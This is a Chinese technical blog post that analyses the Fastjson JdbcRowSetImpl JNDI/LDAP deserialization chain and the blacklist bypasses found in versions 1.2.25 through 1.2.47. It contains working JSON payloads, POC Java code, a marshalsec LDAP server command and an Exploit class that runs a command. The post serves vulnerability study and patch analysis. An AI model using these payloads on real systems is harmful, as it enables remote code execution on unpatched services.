> 原文链接: https://www.anquanke.com//post/id/240446 


# Java安全之FastJson JdbcRowSetImpl 链分析


                                阅读量   
                                **183933**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t010a673b0a529bce62.jpg)](https://p2.ssl.qhimg.com/t010a673b0a529bce62.jpg)



## 0x00 前言

续上文的[Fastjson TemplatesImpl链分析](https://www.cnblogs.com/nice0e3/p/14601670.html)，接着来学习`JdbcRowSetImpl` 利用链，`JdbcRowSetImpl`的利用链在实际运用中较为广泛，这个链基本没啥限制条件，只需要`Json.parse(input)`即可进行命令执行。



## 0x01 漏洞分析

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6"></a>利用限制

首先来说说限制，基于JNDI+RMI或JDNI+LADP进行攻击，会有一定的JDK版本限制。

RMI利用的JDK版本≤ JDK 6u132、7u122、8u113

LADP利用JDK版本≤ 6u211 、7u201、8u191

[![](https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png)](https://p5.ssl.qhimg.com/t01d1736917cdcf7608.png)

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"></a>攻击流程
1. 首先是这个lookup(URI)参数可控
1. 攻击者控制URI参数为指定为恶意的一个RMI服务
1. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
1. 目标在进行`lookup()`操作时，会动态加载并实例化Factory类，接着调用`factory.getObjectInstance()`获取外部远程对象实例；
1. 攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；
### <a class="reference-link" name="JDNI%E6%B3%A8%E5%85%A5%E7%BB%86%E8%8A%82"></a>JDNI注入细节

简单分析一下lookup参数可控后，如何走到RCE.

调用链：
- -&gt; RegistryContext.decodeObject()
- -&gt; NamingManager.getObjectInstance()
- -&gt; factory.getObjectInstance()
- -&gt; NamingManager.getObjectFactoryFromReference()
- -&gt; helper.loadClass(factoryName);
[![](https://p5.ssl.qhimg.com/t01a5ff8f8de735d351.png)](https://p5.ssl.qhimg.com/t01a5ff8f8de735d351.png)

loadclass进行实例化，触发静态代码块的Runtime代码执行命令执行。

[![](https://p0.ssl.qhimg.com/t015cd5093d1ee3a09b.png)](https://p0.ssl.qhimg.com/t015cd5093d1ee3a09b.png)

[![](https://p4.ssl.qhimg.com/t01549470c20b3f13f6.png)](https://p4.ssl.qhimg.com/t01549470c20b3f13f6.png)

### <a class="reference-link" name="%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"></a>调试分析

影响版本：fastjson &lt;= 1.2.24

payload:

```
`{`"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true`}`
```

从前文的TemplatesImpl链分析中得知FastJson在反序列化时会去调用get、set、is方法。
<li>
**[@type](https://github.com/type)：**目标反序列化类名；</li>
<li>
**dataSourceName：**RMI注册中心绑定恶意服务；</li>
<li>
**autoCommit**：在Fastjson JdbcRowSetImpl链中反序列化时，会去调用setAutoCommit方法。</li>
详细分析fastjson如何解析可查看[Fastjson TemplatesImpl链分析](https://www.cnblogs.com/nice0e3/p/14601670.html)文章，再次不做赘诉。

启动LDAP服务端

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:80/#Exploit 1389
```

Exploit代码，需将代码编译成class文件然后挂在到web中

```
import java.io.IOException;

public class Exploit `{`
    public Exploit() `{`
    `}`
    static `{`
        try `{`

            Runtime.getRuntime().exec("calc.exe");
        `}` catch (IOException e) `{`
            e.printStackTrace();
        `}`
    `}`
`}`
```

POC代码：

```
package com.nice0e3;

import com.alibaba.fastjson.JSON;

public class POC `{`
    public static void main(String[] args) `{`
//               String PoC = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://127.0.0.1:1099/refObj\", \"autoCommit\":true`}`";
        String PoC = "`{`\"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true`}`";
        JSON.parse(PoC);
    `}`

`}`
```

[![](https://p0.ssl.qhimg.com/t0129cffe59ddb4ca02.png)](https://p0.ssl.qhimg.com/t0129cffe59ddb4ca02.png)

看到payload中的`dataSourceName`参数在解析时候则会调用`setDataSourceName`对`DataSourceNamece`变量进行赋值，来看到代码

[![](https://p0.ssl.qhimg.com/t01d87c5c339e87266a.png)](https://p0.ssl.qhimg.com/t01d87c5c339e87266a.png)

而`autoCommit`也一样会调用`setAutoCommit`

[![](https://p2.ssl.qhimg.com/t019c723b2e9d2dd9a5.png)](https://p2.ssl.qhimg.com/t019c723b2e9d2dd9a5.png)

`setAutoCommit`方法调用`this.connect();`

[![](https://p5.ssl.qhimg.com/t011533f9b9d6417623.png)](https://p5.ssl.qhimg.com/t011533f9b9d6417623.png)

lookup中则是传入了`this.getDataSourceName()`，返回dataSource变量内容。而这个dataSource内容则是在前面`setDataSourceName`方法中进行设置的，该参数是可控的。所以可以进行JDNI注入从而达到命令执行。

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E9%93%BE"></a>利用链
- -&gt; JdbcRowSetImpl.execute()
- -&gt; JdbcRowSetImpl.prepare()
- -&gt; JdbcRowSetImpl.connect()
- -&gt; InitialContext.lookup(dataSource)
而在Fastjson JdbcRowSetImpl 链利用中，则是利用了后半段。



## 0x02 绕过方式

### <a class="reference-link" name="1.2.25%E7%89%88%E6%9C%AC%E4%BF%AE%E5%A4%8D"></a>1.2.25版本修复

先将Fastjson组件升级到1.2.25版本后进行发送payload，查看是否能够利用成功。

[![](https://p2.ssl.qhimg.com/t01085a5b6ca5669e95.png)](https://p2.ssl.qhimg.com/t01085a5b6ca5669e95.png)

修复改动：
1. 自从1.2.25 起 autotype 默认为False
1. 增加 checkAutoType 方法，在该方法中进行黑名单校验，同时增加白名单机制
[Fastjson AutoType说明](https://github.com/alibaba/fastjson/wiki/enable_autotype)

根据官方文档开启AutoType的方式，假设不开启该功能是无法进行反序列化的。因为默认白名单是空的，需要自定义。白名单的绕过基本不可能，都是从黑名单作为入口。白名单需要添加，而黑名单中则是内置在Fastjson中。

#### <a class="reference-link" name="1%E3%80%81JVM%E5%90%AF%E5%8A%A8%E5%8F%82%E6%95%B0"></a>1、JVM启动参数

```
-Dfastjson.parser.autoTypeSupport=true
```

#### <a class="reference-link" name="2%E3%80%81%E4%BB%A3%E7%A0%81%E4%B8%AD%E8%AE%BE%E7%BD%AE"></a>2、代码中设置

```
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

下面来看代码，这里使用了IDEA中的jar包对比功能

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b82012d0e7ab7d26.png)

可以看到`DefaultJSONParser`发送了变动，在这里多了一个`checkAutoType`方法去做校验。

跟进方法查看

[![](https://p4.ssl.qhimg.com/t01ff09cbbfe74b70b2.png)](https://p4.ssl.qhimg.com/t01ff09cbbfe74b70b2.png)

前面会进行白名单的校验，如果匹配中的话调用loadClass加载，返回一个Class对象。 这里默认白名单的列表为空。

[![](https://p4.ssl.qhimg.com/t0137bc6df439407d56.png)](https://p4.ssl.qhimg.com/t0137bc6df439407d56.png)

后面这则是会恶意类的黑名单进行匹配，如果加载类的前面包含黑名单所定义的字符则抛出异常。

### <a class="reference-link" name="1.2.25-1.2.41%20%E7%BB%95%E8%BF%87"></a>1.2.25-1.2.41 绕过

```
package com.nice0e3;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class POC `{`
    public static void main(String[] args) `{`
    //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String PoC = "`{`\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\", \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true`}`";
        JSON.parse(PoC);
    `}`
`}`
```

先来调试不开启的情况，前面依旧就会遍历黑名单对class进行赋值，但最后这个会去检测如果未开启，则直接抛异常，开启则会去返回。

[![](https://p3.ssl.qhimg.com/t0197a9793be67543f6.png)](https://p3.ssl.qhimg.com/t0197a9793be67543f6.png)

将注释打开后，则直接返回class

[![](https://p3.ssl.qhimg.com/t019f5d6fb159fdfd30.png)](https://p3.ssl.qhimg.com/t019f5d6fb159fdfd30.png)

[![](https://p2.ssl.qhimg.com/t0107703cb32293aaf7.png)](https://p2.ssl.qhimg.com/t0107703cb32293aaf7.png)

命令执行成功。但是可以看到前面的class是`Lcom.sun.rowset.JdbcRowSetImpl`为什么也会触发命令执行？

原因在于`com.alibaba.fastjson.parser#TypeUtils.loadClass(typeName, this.defaultClassLoader);`方法中，可跟进查看。

[![](https://p1.ssl.qhimg.com/t01cd5cb6193f67c67a.png)](https://p1.ssl.qhimg.com/t01cd5cb6193f67c67a.png)

[![](https://p0.ssl.qhimg.com/t01dea2fd740cc515fe.png)](https://p0.ssl.qhimg.com/t01dea2fd740cc515fe.png)<br>
这里解析到内容如果为`L`开头，`;`结尾的话就会将这2个字符清空，前面其实还有一个`[`。

### <a class="reference-link" name="1.2.42%20%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"></a>1.2.42 修复方式

修复改动：明文黑名单改为HASH值,`checkcheckAutoType`方法添加`L`和`;`字符过滤。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01badc70d5e064dd47.png)

加密方法位于`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`可将进行碰撞获取值。

### <a class="reference-link" name="1.2.42%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"></a>1.2.42绕过方式

```
package com.nice0e3;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class POC `{`
    public static void main(String[] args) `{`
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String PoC = "`{`\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\", \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true`}`";
        JSON.parse(PoC);
    `}`

`}`
```

[![](https://p0.ssl.qhimg.com/t01dd61f1b4877d4b43.png)](https://p0.ssl.qhimg.com/t01dd61f1b4877d4b43.png)

在`com.alibaba.fastjson.parser#checkcheckAutoType`中将`L`和`;`进行清空。这里是利用了双写的方式，前面的规则将第一组`L`和`;`，进行清空，而在`TypeUtils.loadclass`中将第二组内容清空。

[![](https://p2.ssl.qhimg.com/t01f08e253e7ca114bc.png)](https://p2.ssl.qhimg.com/t01f08e253e7ca114bc.png)

### <a class="reference-link" name="1.2.43%20%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"></a>1.2.43 修复方式

在1.2.43版本中对了LL开头的绕过进行了封堵

```
//hash计算基础参数            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            //L开头，；结尾            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) `{`                //LL开头                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) `{`                                      throw new JSONException("autoType is not support. " + typeName);                `}`                className = className.substring(1, className.length() - 1);            `}`
```

再次执行poc代码可以看到报错了。

```
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. LLcom.sun.rowset.JdbcRowSetImpl;;    at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:914)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:311)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1338)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1304)    at com.alibaba.fastjson.JSON.parse(JSON.java:152)    at com.alibaba.fastjson.JSON.parse(JSON.java:162)    at com.alibaba.fastjson.JSON.parse(JSON.java:131)    at com.nice0e3.POC.main(POC.java:12)
```

### <a class="reference-link" name="1.2.43%20%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"></a>1.2.43 绕过方式

前面可以看到`[`也进行了清空，可以从该地方进行入手。

```
public class POC `{`    public static void main(String[] args) `{`        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "`{`\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[, \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true`}`";        JSON.parse(PoC);    `}``}`
```

执行报错了，报错信息如下：

```
Exception in thread "main" com.alibaba.fastjson.JSONException: syntax error, expect `{`, actual string, pos 44, fastjson-version 1.2.43    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseRest(JavaBeanDeserializer.java:1261)    at com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_JdbcRowSetImpl.deserialze(Unknown Source)    at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:267)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:729)    at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:183)    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:373)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1338)    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1304)    at com.alibaba.fastjson.JSON.parse(JSON.java:152)    at com.alibaba.fastjson.JSON.parse(JSON.java:162)    at com.alibaba.fastjson.JSON.parse(JSON.java:131)    at com.nice0e3.POC.main(POC.java:12)
```

提示缺少了一个``{``

```
public class POC `{`    public static void main(String[] args) `{`        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "`{`\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[`{`, \"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\", \"autoCommit\":true`}`";        JSON.parse(PoC);    `}``}`
```

[![](https://p4.ssl.qhimg.com/t01a65e0a6a8c9bf872.png)](https://p4.ssl.qhimg.com/t01a65e0a6a8c9bf872.png)

### <a class="reference-link" name="1.2.44%20%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"></a>1.2.44 修复方式

将`[`进行限制，具体实现可自行查看。

再次执行前面的poc代码可以看到报错了。

### <a class="reference-link" name="1.2.45%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"></a>1.2.45绕过方式

利用条件需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。

```
public class POC `{`    public static void main(String[] args) `{`        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String PoC = "`{`\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":`{`\"data_source\":\"ldap://127.0.0.1:1389/Exploit\"`}``}`";        JSON.parse(PoC);    `}``}`
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t012608e2ea52b3dd17.png)

下面来分析一下使用这个payload为什么能绕过。其实是借助了`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`进行绕过，`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`并不在黑名单中。

这里是对反序列化后的对象是`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`

传入`properties`参数，则会去自动调用`setProperties`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011aa3809b12daa113.png)

[![](https://p5.ssl.qhimg.com/t01ed4a4e87b35deb83.png)](https://p5.ssl.qhimg.com/t01ed4a4e87b35deb83.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010c3eff789e81b509.png)

而在1.2.46无法执行成功，应该是对该类拉入了黑名单中。



## 1.2.25-1.2.47通杀

为什么说这里标注为通杀呢，其实这里和前面的绕过方式不太一样，这里是可以直接绕过`AutoTypeSupport`，即便关闭`AutoTypeSupport`也能直接执行成功。

先来看payload

```
public class POC `{`    public static void main(String[] args) `{`              String PoC = "`{`\n" +                "    \"a\":`{`\n" +                "        \"@type\":\"java.lang.Class\",\n" +                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +                "    `}`,\n" +                "    \"b\":`{`\n" +                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +                "        \"dataSourceName\":\"ldap://localhost:1389/badNameClass\",\n" +                "        \"autoCommit\":true\n" +                "    `}`\n" +                "`}`";        JSON.parse(PoC);    `}``}`
```

[![](https://p0.ssl.qhimg.com/t017e59d2c838a66464.png)](https://p0.ssl.qhimg.com/t017e59d2c838a66464.png)

可以看到payload和前面的payload构造不太一样，这里来分析一下。

[![](https://p4.ssl.qhimg.com/t01be2cec57b0dd6279.png)](https://p4.ssl.qhimg.com/t01be2cec57b0dd6279.png)

这里未开启`AutoTypeSupport`不会走到下面的黑白名单判断。

fastjson会使用 `checkAutoType` 方法来检测`[@type](https://github.com/type)`中携带的类，但这次我们传入的是一个`java.lang.class`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c05ff78da55bf60f.png)

来看到`com.alibaba.fastjson.parser.DefaultJSONParser.class#parseObject`方法中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01f1e3bd2ae6032b79.png)

跟进`deserialze`方法查看，这里的`deserialze`是`MiscCodec#deserialze`

上面代码会从`objVal = parser.parse();`获取内容为`com.sun.rowset.JdbcRowSetImpl`。来看到下面

```
if (clazz == Class.class) `{`    return TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`}`
```

这里使用了`TypeUtils.loadClass`函数加载了`strVal`，也就是JdbcRowSetlmpl，跟进发现会将其缓存在map中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0172673d9beca65dd0.png)

这里的true参数代表开启缓存，如果开启将恶意类存储到mapping中

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01126b2b2b27e4d2c1.png)

断点来到`com.alibaba.fastjson.parser.DefaultJSONParser#checkAutoType`

[![](https://p5.ssl.qhimg.com/t015289d9c5a3536680.png)](https://p5.ssl.qhimg.com/t015289d9c5a3536680.png)

因为前面将`com.sun.rowset.JdbcRowSetImpl`所以这里能获取到`com.sun.rowset.JdbcRowSetImpl`该判断不为true，从而绕过黑名单。

[![](https://p0.ssl.qhimg.com/t019d07272675385707.png)](https://p0.ssl.qhimg.com/t019d07272675385707.png)

而后续则是和前面的一样，通过`dataSourceName`触发对于的set方法将`dataSourceName`变量进行设置，而后通过`autoCommit`,触发`setAutoCommit`触发`lookup()`达到命令执行。

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></a>参考文章

```
https://xz.aliyun.com/t/9052
https://xz.aliyun.com/t/7027
https://kingx.me/Exploit-Java-Deserialization-with-RMI.html
http://wjlshare.com/archives/1526
```



## 0x03 结尾

其实后面还有几个绕过的方式后面再去做分析，除此外还有一些BCEL来解决fastjson不出网回显等方面都值得去思考和研究。如有不对望师傅们指出。
